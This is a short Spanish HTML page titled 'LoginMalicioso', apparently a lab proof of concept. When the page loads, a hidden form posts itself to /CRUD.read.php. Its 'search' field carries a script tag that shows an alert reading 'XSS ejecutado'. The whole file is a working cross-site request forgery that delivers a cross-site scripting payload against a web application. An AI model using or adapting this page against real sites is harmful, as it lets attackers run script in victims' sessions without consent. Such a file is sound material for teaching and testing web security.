<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LoginMalicioso</title>
    <script>
        function enviarFormulario() {
            document.getElementById("miFormulario").submit();
        }
    </script>
</head>
<body style="background-color:powderblue;" onload="enviarFormulario()">
    <form id="miFormulario" action="/CRUD.read.php" method="POST">
        <input type="hidden" name="search" value="<script>alert('XSS ejecutado');</script>">
    </form>

</body>
</html>

